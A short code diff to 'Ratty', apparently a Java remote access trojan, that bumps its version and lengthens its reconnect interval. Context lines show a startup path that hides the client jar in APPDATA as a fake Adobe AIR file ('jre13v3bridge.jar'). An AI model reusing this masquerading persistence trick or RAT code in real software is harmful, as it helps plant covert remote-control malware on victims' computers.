@@ -23,14 +23,14 @@ import de.sogomn.rat.server.gui.RattyGuiController;
 public final class Ratty {
 	
 	public static final boolean DEBUG = true;
-	public static final String VERSION = "1.13";
+	public static final String VERSION = "1.14";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	
 	private static String address;
 	private static int port;
 	private static boolean client;
 	
-	private static final int CONNECTION_INTERVAL = 2500;
+	private static final int CONNECTION_INTERVAL = 5000;
 	private static final int MAX_PORT = 65535;
 	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
 	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR" + File.separator + "jre13v3bridge.jar";
